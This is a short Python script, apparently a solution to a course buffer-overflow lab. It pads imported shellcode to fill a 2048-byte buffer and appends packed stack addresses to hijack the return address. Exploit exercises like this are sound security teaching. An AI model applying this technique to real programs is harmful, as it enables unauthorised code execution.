#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# address of buf: 0xfffeeda4
# address of ret: 0xfffef5b0
# address of ebp: 0xfffef5ac

buff_len = 2048
buff_start = 0xfffeeda4
ret = 0xfffef5b0

buff = shellcode + b"A" * (buff_len - len(shellcode))
string = buff + pack("<I", buff_start) + pack("<I", ret)
sys.stdout.buffer.write(string)

